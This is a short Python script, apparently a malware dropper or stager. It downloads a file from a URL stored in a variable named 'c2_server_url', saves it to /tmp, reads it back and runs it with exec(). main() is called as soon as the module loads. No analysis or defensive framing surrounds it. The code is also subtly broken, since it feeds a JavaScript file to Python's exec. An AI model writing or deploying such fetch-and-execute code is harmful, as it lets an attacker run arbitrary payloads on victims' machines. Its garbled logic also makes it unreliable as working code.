import requests
import os

def get_code(url):
    response = requests.get(url)
    return response.text

def save_code_to_file(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def load_code_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def run_code(script):
    exec(script)

def main():
    c2_server_url = "https://server.com/sample.js"
    temp_file_path = "/tmp/sample87.js"
    
    code = get_code(c2_server_url)
    save_code_to_file(temp_file_path, code)
    script = load_code_from_file(temp_file_path)
    run_code(script)

main()
